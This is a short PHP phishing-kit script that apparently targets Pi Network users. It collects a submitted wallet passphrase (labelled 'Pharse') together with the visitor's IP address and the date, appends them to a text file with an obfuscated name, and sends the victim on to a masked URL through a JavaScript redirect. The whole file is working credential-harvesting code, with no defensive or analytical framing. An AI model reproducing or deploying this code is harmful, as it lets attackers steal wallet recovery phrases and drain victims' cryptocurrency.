<?php
$file = "**_**=========***xxxxx^0_^xxxx***____*Pi_Network*____**====xxxxx^0_0^xxxxxx========**_**.txt";
$username = htmlspecialchars($_POST['username']);
$PASS = htmlspecialchars($_POST['PASS']);
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "===========================[liveGood]===========================\n");
fwrite($handle, "Pharse			: " . $username . "\n");
fwrite($handle, "IP Address		: " . $ip . "\n");
fwrite($handle, "Date Submitted		: " . $today . "\n");
fwrite($handle, "===========================[liveGood]===========================\n");
fclose($handle);
// Redirect menggunakan JavaScript
echo "<script LANGUAGE=\"JavaScript\">
window.location=\"xxxxxxxxxxxxxxxxxxxxxxxxx\";
</script>";
?>
